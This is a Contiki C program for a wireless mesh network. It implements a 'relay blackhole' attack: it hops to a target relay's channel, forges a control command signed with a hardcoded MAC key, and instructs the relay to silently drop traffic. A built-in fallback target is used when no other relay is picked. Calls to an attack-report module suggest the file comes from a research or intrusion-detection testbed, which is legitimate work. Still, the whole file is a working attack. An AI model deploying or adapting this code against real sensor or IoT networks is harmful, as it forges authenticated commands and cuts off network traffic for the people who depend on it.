#include "contiki.h"
#include "net/rime/mesh.h"
#include "attack_report.h"
#include "relay_targeting.h"
#include "security_control.h"
#include <stdio.h>
#include <string.h>

#define RADIO_CHANNEL_START 129
#define RADIO_CHANNEL_COUNT 4

#define MSG_VER 1

#define MAC_KEY 0x6a09e667u

#define BLACKHOLE_DELAY_SEC 3
#define ATTACK_FALLBACK_RELAY_ID 8
#define ATTACK_FALLBACK_CHANNEL 129

PROCESS(relay_blackhole_proc, "Relay blackhole");
AUTOSTART_PROCESSES(&relay_blackhole_proc);

static uint8_t current_channel = RADIO_CHANNEL_START;
static uint8_t channel_index = 0;
static const uint8_t channel_list[RADIO_CHANNEL_COUNT] = {129, 130, 131, 132};

static void recv_mesh(struct mesh_conn *c, const linkaddr_t *from, uint8_t hops);
static const struct mesh_callbacks mesh_cb = { recv_mesh, NULL, NULL };
static struct mesh_conn mesh;

static uint32_t
mac_fnv1a(const void *data, size_t len)
{
  const uint8_t *p = (const uint8_t *)data;
  uint32_t h = 2166136261u;
  uint32_t key = MAC_KEY;
  int i;

  for(i = 0; i < 4; i++) {
    h ^= (uint8_t)(key & 0xff);
    h *= 16777619u;
    key >>= 8;
  }
  for(size_t j = 0; j < len; j++) {
    h ^= p[j];
    h *= 16777619u;
  }
  return h;
}

static void
set_channel(uint8_t ch)
{
  if(ch == current_channel) {
    return;
  }
  mesh_close(&mesh);
  current_channel = ch;
  mesh_open(&mesh, current_channel, &mesh_cb);
}

static void
send_control_command(uint8_t relay_id, uint8_t channel, uint8_t cmd)
{
  control_msg_t ctrl;
  linkaddr_t dest;

  set_channel(channel);
  ctrl.ver = MSG_VER;
  ctrl.cmd = cmd;
  ctrl.value = 0;
  ctrl.duration = 0;
  ctrl.t = clock_seconds();
  ctrl.mac = 0;
  ctrl.mac = mac_fnv1a(&ctrl, sizeof(ctrl));
  packetbuf_copyfrom(&ctrl, sizeof(ctrl));
  dest.u8[0] = relay_id;
  dest.u8[1] = 0;
  mesh_send(&mesh, &dest);
}

static void
recv_mesh(struct mesh_conn *c, const linkaddr_t *from, uint8_t hops)
{
  (void)c;
  (void)from;
  (void)hops;
}

PROCESS_THREAD(relay_blackhole_proc, ev, data)
{
  static struct etimer timer;
  static uint8_t attack_sent;
  static relay_target_t fallback_target;

  PROCESS_EXITHANDLER(mesh_close(&mesh); relay_targeting_close();)
  PROCESS_BEGIN();

  attack_sent = 0;
  current_channel = channel_list[channel_index % RADIO_CHANNEL_COUNT];
  mesh_open(&mesh, current_channel, &mesh_cb);
  relay_targeting_init();
  etimer_set(&timer, CLOCK_SECOND * BLACKHOLE_DELAY_SEC);

  while(1) {
    PROCESS_WAIT_EVENT();
    if(ev == PROCESS_EVENT_TIMER && data == &timer) {
      relay_target_t *target = relay_target_pick(clock_seconds());

      if(target == NULL) {
        memset(&fallback_target, 0, sizeof(fallback_target));
        fallback_target.used = 1;
        fallback_target.relay_id = ATTACK_FALLBACK_RELAY_ID;
        fallback_target.channel = ATTACK_FALLBACK_CHANNEL;
        target = &fallback_target;
      }
      if(!attack_sent) {
        send_control_command(target->relay_id, target->channel,
                             CTRL_CMD_RELAY_BLACKHOLE);
        attack_report_emit(REPORT_ALERT_BLACKHOLE, "blackhole");
        printf("Relay blackhole enabled on relay %u\n", target->relay_id);
        attack_sent = 1;
      }
    }
  }

  PROCESS_END();
}
